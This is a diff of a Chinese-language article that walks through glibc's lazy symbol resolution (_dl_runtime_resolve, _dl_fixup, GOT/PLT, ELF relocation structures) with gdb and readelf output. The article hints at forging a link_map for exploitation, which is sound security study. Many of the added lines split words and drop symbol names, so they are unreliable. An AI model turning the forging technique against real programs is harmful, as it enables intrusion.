@@ -28,31 +28,32 @@ _dl_relocate_object (struct link_map *l, struct r_scope_elem *scope[],
  ......
 }
 
-# define ELF_DYNAMIC_RELOCATE(map, scope, lazy, consider_profile, skip_ifunc) 
- do { 
- int edr_lazy = elf_machine_runtime_setup ((map), (scope), (lazy), 
- (consider_profile)); 
- if (((map) != &GL(dl_rtld_map) || DO_RTLD_BOOTSTRAP)) 
- ELF_DYNAMIC_DO_RELR (map); 
- ELF_DYNAMIC_DO_REL ((map), (scope), edr_lazy, skip_ifunc); 
- ELF_DYNAMIC_DO_RELA ((map), (scope), edr_lazy, skip_ifunc); 
+# define ELF_DYNAMIC_RELOCATE(map, scope, lazy, consider_profile, skip_ifunc)
+ do {
+ int edr_lazy = elf_machine_runtime_setup ((map), (scope), (lazy),
+ (consider_profile));
+ if (((map) != &GL(dl_rtld_map) || DO_RTLD_BOOTSTRAP))
+ ELF_DYNAMIC_DO_RELR (map);
+ ELF_DYNAMIC_DO_REL ((map), (scope), edr_lazy, skip_ifunc);
+ ELF_DYNAMIC_DO_RELA ((map), (scope), edr_lazy, skip_ifunc);
  } while (0)
 
 下面展示了调用期链接具体使用的解析函数。
 
-0x0000000000401134 <+14>: call 0x401030 <puts@plt>
+0x0000000000401134 <+14>: call 0x401030 
 
 (gdb) x /3i 0x401030
- 0x401030 <puts@plt>: jmp *0x2fca(%rip) # 0x404000 <puts@got.plt>
- 0x401036 <puts@plt+6>: push $0x0
- 0x40103b <puts@plt+11>: jmp 0x401020
+ 0x401030 : jmp *0x2fca(%rip) # 0x404000 
+ 0x401036 : push $0x0
+ 0x40103b : jmp 0x401020
 
 从上面可以看到程序会根据0x404000中的地址信息决定调用的函数是什么，当解析函数完成解析工作后，0x404000中的地址一定会被修改为动态链接函数的所在地址，因此我们可以在0x404000地址上设置监测点，查看解析函数的真身是谁。
 
 当监测点发现地址上的数据发生变动后，就会自动中断下来，通过查看调用栈可以知道_dl_runtime_resolve_fxsave负责解析动态链接函数。
 
 (gdb) bt
-#0 0x00007ffff7fd7184 in _dl_fixup (l=0x7ffff7ffe2e0, reloc_arg=<optimized out>) at dl-runtime.c:163
+#0 0x00007ffff7fd7184 in _dl_fixup (l=0x7ffff7ffe2e0, reloc_arg=<optimized out>) at dl-runtime.c:
+163
 #1 0x00007ffff7fd9557 in _dl_runtime_resolve_fxsave () at ../sysdeps/x86_64/dl-trampoline.h:98
 #2 0x0000000000401139 in main () at main.c:5
 #3 0x00007ffff7dd0e08 in ?? () from /usr/lib/libc.so.6
@@ -187,7 +188,7 @@ typedef struct
 
 Symbol table '.dynsym' contains 6 entries:
  Num: Value Size Type Bind Vis Ndx Name
- 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 
+ 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND
  1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _[...]@GLIBC_2.34 (2)
  2: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...]
  3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (3)
@@ -222,7 +223,8 @@ Relocation section '.rela.dyn' at offset 0x530 contains 4 entries:
 000000403fd8 000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
 000000403fe0 000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0
 
-Relocation section '.rela.plt' at offset 0x590 contains 1 entry:
+Relocation section '.rela.plt' at offset 0x590 contains 1 en
+try:
  Offset Info Type Sym. Value Sym. Name + Addend
 000000404000 000300000007 R_X86_64_JUMP_SLOT 0000000000000000 puts@GLIBC_2.2.5 + 0
 
@@ -249,16 +251,16 @@ typedef struct
 
 首次调用动态链接函数时，PLT中首条指令jmp会带我们前往第二条指令push，push会将符号在.rela.plt中的索引值压入栈内，最后一条jmp指令会带我们前往.plt节中的首表项。
 
-(gdb) 
+(gdb)
 0x0000000000401030 in puts@plt ()
 1: x/i $rip
-=> 0x401030 <puts@plt>: jmp *0x2fca(%rip) # 0x404000 <puts@got.plt>
+=> 0x401030 : jmp *0x2fca(%rip) # 0x404000 
 (gdb) x /gx 0x404000
-0x404000 <puts@got.plt>: 0x0000000000401036
+0x404000 : 0x0000000000401036
 (gdb) si
 0x0000000000401036 in puts@plt ()
 1: x/i $rip
-=> 0x401036 <puts@plt+6>: push $0x0
+=> 0x401036 : push $0x0
 
 .plt节中的首表项中存储着_dl_runtime_resolve_fxsave函数的地址，该函数进行重定位操作的关键函数。
 
@@ -271,7 +273,7 @@ push指令会将当前link_map信息所在地址压入栈内。
 (gdb) info symbol 0x00007ffff7fd9510
 _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 
-0000000000401020 <puts@plt-0x10>:
+0000000000401020 :
  401020: ff 35 ca 2f 00 00 push 0x2fca(%rip) # 403ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026: ff 25 cc 2f 00 00 jmp *0x2fcc(%rip) # 403ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102c: 0f 1f 40 00 nopl 0x0(%rax)
@@ -407,7 +409,8 @@ r8：
 (gdb) x /gx 0x403e88+0x8
 0x403e90: 0x00000000004003e0
 
-参与比较运算的数值分别是0x20和rdi+0x356地址上存储的数据，这里GLibC中使用了一个特别的用法，就是在变量名后添加:和数字，作用是指定变量占用的比特位，其中rdi+0x356对应着link_map中的l_audit_any_plt到l_find_object_processed成员，0x20就是用于判断l_find_object_processed成员的值是否为1。
+参与比较运算的数值分别是0x20和rdi+0x356地址上存储的数据，这里GLibC中使用了一个特别的用法，就是在变量名后添加:
+和数字，作用是指定变量占用的比特位，其中rdi+0x356对应着link_map中的l_audit_any_plt到l_find_object_processed成员，0x20就是用于判断l_find_object_processed成员的值是否为1。
 
 unsigned int l_audit_any_plt:1;
 unsigned int l_removed:1;
@@ -419,10 +422,10 @@ unsigned int l_find_object_processed:1;
 test指令和je指令是较为常见的比较运算指令，其中的也逻辑并不复杂，test指令在进行完与运行后，会根据运算结果设置eflags标志位寄存器中的ZF标志位（Zero Flag），je指令会根据ZF标志位决定是否跳转（ZF为1时跳转），下面展示了test指令运行前后的eflags寄存器信息。
 
 运行前：
-(gdb) info registers eflags 
+(gdb) info registers eflags
 eflags 0x10202 [ IF RF ]
 运行后：
-(gdb) info registers eflags 
+(gdb) info registers eflags
 eflags 0x10246 [ PF ZF IF RF ]
 
 这里如果判断l_find_object_processed为1，就代表lt_library不需要处理，反之则进行处理，一般情况下都是不需要进行处理的。
@@ -504,14 +507,14 @@ r8中存储的是.dynsym节基地址，基地址加符号索引值乘符号表�
 r8+24=0x400428
 下面通过Elf64_Sym结构体对该地址上的数据进行解释：
 (gdb) p *(Elf64_Sym*)(0x400428)
-$16 = {st_name = 1, st_info = 18 ' 22', st_other = 0 ' 00', st_shndx = 0, 
+$16 = {st_name = 1, st_info = 18 ' 22', st_other = 0 ' 00', st_shndx = 0,
  st_value = 0, st_size = 0}
 
 st_name索引值刚好可以和下方0x400471对应（0x400470 + 1）
 rdi对应.dynstr节：
 (gdb) x /s $rdi
 0x400470: ""
-(gdb) 
+(gdb)
 0x400471: "puts"
 
 st_info数值对应二进制格式为：0001 0010
@@ -575,10 +578,11 @@ rdx 0x3 3
 Version symbols section '.gnu.version' contains 6 entries:
  Addr: 0x00000000004004ee Offset: 0x000004ee Link: 6 (.dynsym)
  000: 0 (*local*) 2 (GLIBC_2.34) 1 (*global*) 3 (GLIBC_2.2.5)
- 004: 1 (*global*) 1 (*global*) 
+ 004: 1 (*global*) 1 (*global*)
 
 符号对应的版本信息：
-Relocation section '.rela.plt' at offset 0x590 contains 1 entry:
+Relocation section '.rela.plt' at offset 0x590 contains 1 en
+try:
  Offset Info Type Sym. Value Sym. Name + Addend
 000000404000 000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
 
@@ -591,23 +595,25 @@ r8 0x7ffff7f9c5c8 140737353729480
 (gdb) p *(struct r_found_version*)0x7ffff7f9c5c8
 $36 = {name = 0x400492 "GLIBC_2.2.5", hash = 157882997, hidden = 0, filename = 0x400488 "libc.so.6"}
 
-0x00007ffff7fd70b7 <+199>: mov %fs:0x18,%ecx
+0x00007ffff7fd70b7 <+199>: mov %fs:
+0x18,%ecx
 0x00007ffff7fd70bf <+207>: mov $0x1,%edx
 0x00007ffff7fd70c4 <+212>: test %ecx,%ecx
 0x00007ffff7fd70c6 <+214>: je 0x7ffff7fd70d9 <_dl_fixup+233>
-0x00007ffff7fd70c8 <+216>: movl $0x1,%fs:0x1c
+0x00007ffff7fd70c8 <+216>: movl $0x1,%fs:
+0x1c
 0x00007ffff7fd70d4 <+228>: mov $0x5,%edx
 
 设置完版本信息后，程序会从fs寄存器偏移0x18处取出数值给ecx，fs是为了保存局部线程信息而存在的，其中偏移0x18对应着multiple_threads，显然这里使用判断程序是否是多线程，如果发现multiple_threads为0，就会跳转到0x233的位置，不针对多线程进行设置。反之，则会设置偏移0x1c处的gscope_flag成员，避免不同线程间发生冲突。
 
 p *(tcbhead_t*)$fs_base
-$39 = {tcb = 0x7ffff7da8740, dtv = 0x7ffff7da90e0, self = 0x7ffff7da8740, multiple_threads = 0, gscope_flag = 0, sysinfo = 0, stack_guard = 15852976144659649792, 
- pointer_guard = 7034873935951137108, unused_vgetcpu_cache = {0, 0}, feature_1 = 0, __glibc_unused1 = 0, __private_tm = {0x0, 0x0, 0x0, 0x0}, 
+$39 = {tcb = 0x7ffff7da8740, dtv = 0x7ffff7da90e0, self = 0x7ffff7da8740, multiple_threads = 0, gscope_flag = 0, sysinfo = 0, stack_guard = 15852976144659649792,
+ pointer_guard = 7034873935951137108, unused_vgetcpu_cache = {0, 0}, feature_1 = 0, __glibc_unused1 = 0, __private_tm = {0x0, 0x0, 0x0, 0x0},
  __private_ss = 0x0, ssp_base = 0, __glibc_unused2 = {{{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {
- i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 
- 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 
+ i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0,
+ 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0,
  0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {
- i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}}, __padding = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 
+ i = {0, 0, 0, 0}}}, {{i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}, {i = {0, 0, 0, 0}}}}, __padding = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
  0x0}}
 
 确保多线程不会惹来麻烦的前提下，程序会开始通过_dl_lookup_symbol_x函数寻找符号，首先要做的是准备_dl_lookup_symbol_x函数需要的形参。
@@ -635,7 +641,7 @@ r8 0x7ffff7f9c5c8 140737353729480
 r9 0x1 1
 (gdb) x /gx $rsp
 0x7fffffffdb60: 0x0000000000000001
-(gdb) 
+(gdb)
 0x7fffffffdb68: 0x0000000000000000
 
 _dl_lookup_symbol_x函数内部具体的操作暂时不从汇编代码的角度进行解析，这里暂时只需要知道它会根据符号名进行检索，返回对应动态链接库的基地址，并修改提供的动态链接符号信息。
@@ -649,7 +655,8 @@ rax 0x7ffff7f9c000 140737353728000
 
 找到动态链接的基地址后，首先做的从TLS中取出gscope_flag，判断是否是多线程，如果是多线程就会跳转到0x424处，反之则会继续执行。
 
-0x00007ffff7fd7100 <+272>: mov %fs:0x18,%eax
+0x00007ffff7fd7100 <+272>: mov %fs:
+0x18,%eax
 0x00007ffff7fd7108 <+280>: pop %r8
 0x00007ffff7fd710a <+282>: pop %r9
 0x00007ffff7fd710c <+284>: test %eax,%eax
@@ -673,7 +680,7 @@ rax 0x7ffff7f9c000 140737353728000
 
 rbp-0x40存储0x7ffff7db1af0，下面通过Elf64_Sym进行解释：
 (gdb) p *(Elf64_Sym*)0x7ffff7db1af0
-$3 = {st_name = 27823, st_info = 34 '"', st_other = 0 ' 00', st_shndx = 15, 
+$3 = {st_name = 27823, st_info = 34 '"', st_other = 0 ' 00', st_shndx = 15,
  st_value = 527328, st_size = 518}
 0x7ffff7dc2c98是libc.so.6中.dynstr节的地址：
 (gdb) x /s 0x7ffff7dc2c98+27823
@@ -782,9 +789,9 @@ _dl_fixup函数一共只依赖两个参数，而且这两个参数都是我们�
 上面解析_dl_fixup函数时，我们发现当函数发现符号未导出时，就会采用已知符号地址加上修正值l_addr对符号进行检索，这种方式有一种好处，就是不需要大量使用link_map中的信息，减少了我们伪造的难度。
 
 #define LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)->l_addr : 0)
-#define SYMBOL_ADDRESS(map, ref, map_set) 
- ((ref) == NULL ? 0 
- : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0 
+#define SYMBOL_ADDRESS(map, ref, map_set)
+ ((ref) == NULL ? 0
+ : (__glibc_unlikely ((ref)->st_shndx == SHN_ABS) ? 0
  : LOOKUP_VALUE_ADDRESS (map, map_set)) + (ref)->st_value)
 
 value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
@@ -799,7 +806,7 @@ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
+#include 
 #include <string.h>
 
 #define MAX_LEN	0x100
@@ -1459,17 +1466,7 @@ https://bbs.kanxue.com/user-home-1000123.htm
 ```
 一
 _dl_runtime_resolve初探
-```
-
-
-
-```
 0x000000000000001e (FLAGS) BIND_NOW
-```
-
-
-
-```
 void
 _dl_relocate_object (struct link_map *l, struct r_scope_elem *scope[],
  int reloc_mode, int consider_profiling)
@@ -1479,50 +1476,31 @@ _dl_relocate_object (struct link_map *l, struct r_scope_elem *scope[],
  ......
 }
 
-# define ELF_DYNAMIC_RELOCATE(map, scope, lazy, consider_profile, skip_ifunc) 
- do { 
- int edr_lazy = elf_machine_runtime_setup ((map), (scope), (lazy), 
- (consider_profile)); 
- if (((map) != &GL(dl_rtld_map) || DO_RTLD_BOOTSTRAP)) 
- ELF_DYNAMIC_DO_RELR (map); 
- ELF_DYNAMIC_DO_REL ((map), (scope), edr_lazy, skip_ifunc); 
- ELF_DYNAMIC_DO_RELA ((map), (scope), edr_lazy, skip_ifunc); 
+# define ELF_DYNAMIC_RELOCATE(map, scope, lazy, consider_profile, skip_ifunc)
+ do {
+ int edr_lazy = elf_machine_runtime_setup ((map), (scope), (lazy),
+ (consider_profile));
+ if (((map) != &GL(dl_rtld_map) || DO_RTLD_BOOTSTRAP))
+ ELF_DYNAMIC_DO_RELR (map);
+ ELF_DYNAMIC_DO_REL ((map), (scope), edr_lazy, skip_ifunc);
+ ELF_DYNAMIC_DO_RELA ((map), (scope), edr_lazy, skip_ifunc);
  } while (0)
-```
-
-
-
-```
-0x0000000000401134 <+14>: call 0x401030 <puts@plt>
+0x0000000000401134 <+14>: call 0x401030 
 
 (gdb) x /3i 0x401030
- 0x401030 <puts@plt>: jmp *0x2fca(%rip) # 0x404000 <puts@got.plt>
- 0x401036 <puts@plt+6>: push $0x0
- 0x40103b <puts@plt+11>: jmp 0x401020
-```
-
-
-
-```
+ 0x401030 : jmp *0x2fca(%rip) # 0x404000 
+ 0x401036 : push $0x0
+ 0x40103b : jmp 0x401020
 (gdb) bt
-#0 0x00007ffff7fd7184 in _dl_fixup (l=0x7ffff7ffe2e0, reloc_arg=<optimized out>) at dl-runtime.c:163
+#0 0x00007ffff7fd7184 in _dl_fixup (l=0x7ffff7ffe2e0, reloc_arg=<optimized out>) at dl-runtime.c:
+163
 #1 0x00007ffff7fd9557 in _dl_runtime_resolve_fxsave () at ../sysdeps/x86_64/dl-trampoline.h:98
 #2 0x0000000000401139 in main () at main.c:5
 #3 0x00007ffff7dd0e08 in ?? () from /usr/lib/libc.so.6
 #4 0x00007ffff7dd0ecc in __libc_start_main () from /usr/lib/libc.so.6
 #5 0x0000000000401065 in _start ()
-```
-
-
-
-```
 二
 ELF文件是如何支持动态链接的？
-```
-
-
-
-```
 typedef struct
 {
  Elf64_Sxword	d_tag; /* Dynamic entry type */
@@ -1532,21 +1510,11 @@ typedef struct
  Elf64_Addr d_ptr; /* Address value */
  } d_un;
 } Elf64_Dyn;
-```
-
-
-
-```
-#define DT_NULL 0
-#define DT_NEEDED	1
+    #define DT_NULL 0
+    #define DT_NEEDED	1
 ......
-#define DT_EXTRATAGIDX(tag)	((Elf32_Word)-((Elf32_Sword) (tag) <<1>>1)-1)
-#define DT_EXTRANUM	3
-```
-
-
-
-```
+    #define DT_EXTRATAGIDX(tag)	((Elf32_Word)-((Elf32_Sword) (tag) <<1>>1)-1)
+    #define DT_EXTRANUM	3
 readelf工具解析出来的友好信息：
 0x000000000000001e (FLAGS) BIND_NOW
 0x000000006ffffffb (FLAGS_1) Flags: NOW
@@ -1556,35 +1524,20 @@ readelf工具解析出来的友好信息：
 403f28 fbffff6f 00000000 01000000 00000000 ...o............
 
 elf文件中的定义信息：
-#define DT_FLAGS	30
-#define DT_FLAGS_1	0x6ffffffb
+    #define DT_FLAGS	30
+    #define DT_FLAGS_1	0x6ffffffb
 
-#define DF_BIND_NOW	0x00000008
-#define DF_1_NOW	0x00000001
-```
-
-
-
-```
+    #define DF_BIND_NOW	0x00000008
+    #define DF_1_NOW	0x00000001
 Dynamic section at offset 0x2df8 contains 24 entries:
  Tag Type Name/Value
  0x0000000000000001 (NEEDED) Shared library: [libc.so.6]
  ......
  0x0000000000000000 (NULL) 0x0
-```
-
-
-
-```
 00000000 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 |.ELF............|
 00000010 02 00 3e 00 01 00 00 00 40 10 40 00 00 00 00 00 |..>.....@.@.....|
 00000020 40 00 00 00 00 00 00 00 20 37 00 00 00 00 00 00 |@....... 7......|
 00000030 00 00 00 00 40 00 38 00 0d 00 40 00 24 00 23 00 |....@.8...@.$.#.|
-```
-
-
-
-```
 节头表定义：
 typedef struct
 {
@@ -1622,21 +1575,11 @@ sh_link：0x7，sh_info：0x0，sh_addralign：0x8，sh_entsize：0x10
 readelf中的动态链接节头信息（与手工解析结果一致）：
 [21] .dynamic DYNAMIC 0000000000403df8 00002df8
  00000000000001d0 0000000000000010 WA 7 0 8
-```
-
-
-
-```
 00002df8 01 00 00 00 00 00 00 00 18 00 00 00 00 00 00 00 |................|
 00002e08 0c 00 00 00 00 00 00 00 00 10 40 00 00 00 00 00 |..........@.....|
 ......
 00002f58 f0 ff ff 6f 00 00 00 00 ee 04 40 00 00 00 00 00 |...o......@.....|
 00002f68 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
-```
-
-
-
-```
 typedef struct
 {
  Elf64_Word	st_name; /* Symbol name (string tbl index) */
@@ -1649,38 +1592,23 @@ typedef struct
 
 Symbol table '.dynsym' contains 6 entries:
  Num: Value Size Type Bind Vis Ndx Name
- 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 
+ 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND
  1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _[...]@GLIBC_2.34 (2)
  2: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...]
  3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (3)
  4: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__
  5: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...]
-```
-
-
-
-```
 [ 7] .dynstr STRTAB 0000000000400470 00000470
  000000000000007e 0000000000000000 A 0 0 1
 
 00000470 00 70 75 74 73 00 5f 5f 6c 69 62 63 5f 73 74 61 |.puts.__libc_sta|
 ......
 000004e0 72 54 4d 43 6c 6f 6e 65 54 61 62 6c 65 00 00 00 |rTMCloneTable...|
-```
-
-
-
-```
 [ 5] .gnu.hash GNU_HASH 00000000004003c0 000003c0
  000000000000001c 0000000000000000 A 6 0 8
 
 000003c0 01 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 |................|
 000003d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
-```
-
-
-
-```
 Relocation section '.rela.dyn' at offset 0x530 contains 4 entries:
  Offset Info Type Sym. Value Sym. Name + Addend
 000000403fc8 000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
@@ -1688,14 +1616,10 @@ Relocation section '.rela.dyn' at offset 0x530 contains 4 entries:
 000000403fd8 000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
 000000403fe0 000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0
 
-Relocation section '.rela.plt' at offset 0x590 contains 1 entry:
+Relocation section '.rela.plt' at offset 0x590 contains 1 en
+try:
  Offset Info Type Sym. Value Sym. Name + Addend
 000000404000 000300000007 R_X86_64_JUMP_SLOT 0000000000000000 puts@GLIBC_2.2.5 + 0
-```
-
-
-
-```
 typedef struct
 {
  Elf64_Addr	r_offset; /* Address */
@@ -1708,47 +1632,27 @@ typedef struct
  Elf64_Xword	r_info; /* Relocation type and symbol index */
  Elf64_Sxword	r_addend; /* Addend */
 } Elf64_Rela;
-```
-
-
-
-```
 三
 重定位是如何工作的
-```
-
-
-
-```
-(gdb) 
+(gdb)
 0x0000000000401030 in puts@plt ()
 1: x/i $rip
-=> 0x401030 <puts@plt>: jmp *0x2fca(%rip) # 0x404000 <puts@got.plt>
+=> 0x401030 : jmp *0x2fca(%rip) # 0x404000 
 (gdb) x /gx 0x404000
-0x404000 <puts@got.plt>: 0x0000000000401036
+0x404000 : 0x0000000000401036
 (gdb) si
 0x0000000000401036 in puts@plt ()
 1: x/i $rip
-=> 0x401036 <puts@plt+6>: push $0x0
-```
-
-
-
-```
+=> 0x401036 : push $0x0
 (gdb) x /gx 0x403ff8
 0x403ff8: 0x00007ffff7fd9510
 (gdb) info symbol 0x00007ffff7fd9510
 _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 
-0000000000401020 <puts@plt-0x10>:
+0000000000401020 :
  401020: ff 35 ca 2f 00 00 push 0x2fca(%rip) # 403ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026: ff 25 cc 2f 00 00 jmp *0x2fcc(%rip) # 403ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102c: 0f 1f 40 00 nopl 0x0(%rax)
-```
-
-
-
-```
 函数序言：
 0x00007ffff7fd9510 <+0>: endbr64
 0x00007ffff7fd9514 <+4>: push %rbx
@@ -1759,11 +1663,6 @@ _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 清零rsp中的低4个比特位，跟0x10对齐
 0x00007ffff7fd951c <+12>: sub $0x240,%rsp
 分配栈空间
-```
-
-
-
-```
 0x00007ffff7fd9523 <+19>: mov %rax,(%rsp)
 0x00007ffff7fd9527 <+23>: mov %rcx,0x8(%rsp)
 0x00007ffff7fd952c <+28>: mov %rdx,0x10(%rsp)
@@ -1781,11 +1680,6 @@ _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 调用_dl_fixup
 0x00007ffff7fd9557 <+71>: mov %rax,%r11
 保存返回值到r11
-```
-
-
-
-```
 函数结语：
 0x00007ffff7fd955a <+74>: fxrstor 0x40(%rsp)
 恢复上下文信息
@@ -1800,19 +1694,9 @@ _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 0x00007ffff7fd9584 <+116>: mov (%rsp),%rbx
 恢复之前保存的寄存器数值，让后续的使用者使用的数值仍是正确的
 0x00007ffff7fd9588 <+120>: add $0x18,%rsp
-```
-
-
-
-```
 调用动态链接函数：
 0x00007ffff7fd958c <+124>: jmp *%r11
 跳转到r11寄存器保存的地址
-```
-
-
-
-```
 0x00007ffff7fd6ff0 <+0>: endbr64
 0x00007ffff7fd6ff4 <+4>: push %rbp
 保存调用者栈底指针
@@ -1828,11 +1712,6 @@ _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 0x00007ffff7fd7004 <+20>: mov %rdi,%rbx
 0x00007ffff7fd7007 <+23>: sub $0x18,%rsp
 分配栈空间
-```
-
-
-
-```
 0x00007ffff7fd700b <+27>: mov 0x70(%rdi),%rax
 根据形参传递的地址，取出偏移0x70处的数据给rax
 0x00007ffff7fd700f <+31>: mov (%rdi),%rdx
@@ -1840,11 +1719,6 @@ _dl_runtime_resolve_fxsave in section .text of /lib64/ld-linux-x86-64.so.2
 0x00007ffff7fd7012 <+34>: mov 0x8(%rax),%r8
 0x00007ffff7fd7016 <+38>: testb $0x20,0x356(%rdi)
 0x00007ffff7fd701d <+45>: je 0x7ffff7fd7025 <_dl_fixup+53>
-```
-
-
-
-```
 .dynamic节：
  ......
  0x0000000000000006 (SYMTAB) 0x4003e0
@@ -1863,50 +1737,25 @@ rdi 0x7ffff7ffe2e0 140737354130144
 r8：
 (gdb) x /gx 0x403e88+0x8
 0x403e90: 0x00000000004003e0
-```
-
-
-
-```
 unsigned int l_audit_any_plt:1;
 unsigned int l_removed:1;
 unsigned int l_contiguous:1;
 unsigned int l_free_initfini:1;
 unsigned int l_ld_readonly:1;
 unsigned int l_find_object_processed:1;
-```
-
-
-
-```
 运行前：
-(gdb) info registers eflags 
+(gdb) info registers eflags
 eflags 0x10202 [ IF RF ]
 运行后：
-(gdb) info registers eflags 
+(gdb) info registers eflags
 eflags 0x10246 [ PF ZF IF RF ]
-```
-
-
-
-```
 0x00007ffff7fd701f <+47>: add %rdx,%r8
 0x00007ffff7fd7022 <+50>: mov %rdx,%r9
-```
-
-
-
-```
 0x00007ffff7fd7025 <+53>: mov 0x68(%rbx),%rax
 ......
 0x00007ffff7fd7030 <+64>: mov 0x8(%rax),%rdi
 ....
 0x00007ffff7fd703f <+79>: add %r9,%rdi
-```
-
-
-
-```
 偏移0x68的元素为.dynmaic节中.dynstr节：
 (gdb) x /gx $rbx
 0x7ffff7ffe2e0: 0x0000000000000000
@@ -1920,46 +1769,21 @@ eflags 0x10246 [ PF ZF IF RF ]
 .dynstr节信息：
  [ 7] .dynstr STRTAB 0000000000400470 00000470
  000000000000007e 0000000000000000 A 0 0 1
-```
-
-
-
-```
 Elf64_Rela结构体大小：
 (gdb) p sizeof(Elf64_Rela)
 $11 = 24
-```
-
-
-
-```
 0x00007ffff7fd7029 <+57>: mov %esi,%r12d
 0x00007ffff7fd702c <+60>: lea (%r12,%r12,2),%rcx
 0x00007ffff7fd7034 <+68>: mov 0xf8(%rbx),%rax
 0x00007ffff7fd703b <+75>: mov 0x8(%rax),%rax
 0x00007ffff7fd7042 <+82>: lea (%rax,%rcx,8),%r13
 0x00007ffff7fd7046 <+86>: add %r9,%r13
-```
-
-
-
-```
 0x00007ffff7fd7049 <+89>: mov 0x8(%r13),%rsi
 0x00007ffff7fd704d <+93>: mov 0x0(%r13),%r14
 0x00007ffff7fd7051 <+97>: mov %rsi,%rax
 0x00007ffff7fd7054 <+100>: add %rdx,%r14
-```
-
-
-
-```
 (gdb) p sizeof(Elf64_Sym)
 $12 = 24
-```
-
-
-
-```
 0x00007ffff7fd7057 <+103>: shr $0x20,%rax
 0x00007ffff7fd705b <+107>: lea (%rax,%rax,1),%rcx
 0x00007ffff7fd705f <+111>: add %rcx,%rax
@@ -1971,38 +1795,28 @@ $12 = 24
 r8+24=0x400428
 下面通过Elf64_Sym结构体对该地址上的数据进行解释：
 (gdb) p *(Elf64_Sym*)(0x400428)
-$16 = {st_name = 1, st_info = 18 ' 22', st_other = 0 ' 00', st_shndx = 0, 
+$16 = {st_name = 1, st_info = 18 ' 22', st_other = 0 ' 00', st_shndx = 0,
  st_value = 0, st_size = 0}
 
 st_name索引值刚好可以和下方0x400471对应（0x400470 + 1）
 rdi对应.dynstr节：
 (gdb) x /s $rdi
 0x400470: ""
-(gdb) 
+(gdb)
 0x400471: "puts"
 
 st_info数值对应二进制格式为：0001 0010
-#define STB_GLOBAL	1；#define STT_FUNC	2
+    #define STB_GLOBAL	1；#define STT_FUNC	2
 高4个比特位数值为1，对应STB_GLOBAL，低4字节为2，对应STT_FUNC
 上面分析的结果与readelf工具解析的结果一致：
 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (3)
-```
-
-
-
-```
